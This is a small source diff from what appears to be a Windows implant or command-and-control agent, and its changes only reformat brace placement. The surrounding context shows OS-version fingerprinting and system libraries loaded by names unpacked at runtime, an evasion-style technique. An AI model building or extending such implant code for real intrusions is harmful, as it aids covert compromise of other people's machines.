@@ -61,17 +61,22 @@ namespace Implant {
                 if (OSVersionW.dwMinorVersion == 1) {
                     Ctx->session.version = WIN_VERSION_XP;
                 }
-            } else if (OSVersionW.dwMajorVersion == 6) {
+            }
+            else if (OSVersionW.dwMajorVersion == 6) {
                 if (OSVersionW.dwMinorVersion == 0) {
                     Ctx->session.version = WIN_VERSION_2008;
-                } else if (OSVersionW.dwMinorVersion == 1) {
+                }
+                else if (OSVersionW.dwMinorVersion == 1) {
                     Ctx->session.version = WIN_VERSION_2008_R2;
-                } else if (OSVersionW.dwMinorVersion == 2) {
+                }
+                else if (OSVersionW.dwMinorVersion == 2) {
                     Ctx->session.version = WIN_VERSION_2012;
-                } else if (OSVersionW.dwMinorVersion == 3) {
+                }
+                else if (OSVersionW.dwMinorVersion == 3) {
                     Ctx->session.version = WIN_VERSION_2012_R2;
                 }
-            } else if (OSVersionW.dwMajorVersion == 10) {
+            }
+            else if (OSVersionW.dwMajorVersion == 10) {
                 if (OSVersionW.dwMinorVersion == 0) {
                     Ctx->session.version = WIN_VERSION_2016_X;
                 }
@@ -150,8 +155,8 @@ namespace Implant {
             x_assertb(Ctx->modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
             x_assertb(Ctx->modules.iphlpapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
             x_assertb(Ctx->modules.mscoree  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
-
-        } else {
+        }
+        else {
             success_(false);
         }
 
